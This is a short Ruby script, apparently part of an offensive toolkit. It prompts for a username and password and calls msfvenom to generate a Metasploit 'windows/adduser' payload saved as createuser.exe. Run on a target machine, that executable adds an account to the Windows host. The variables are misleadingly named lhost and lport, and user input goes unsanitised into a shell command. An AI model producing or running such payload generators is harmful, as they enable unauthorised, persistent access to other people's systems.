print "add new user username:"
lhost = gets

print lhost
print "add new user password:"
lport = gets

print lport

system("msfvenom -p windows/adduser USER=" + lhost + " PASSWORD=" + lport + " " + "-f exe > createuser.exe")
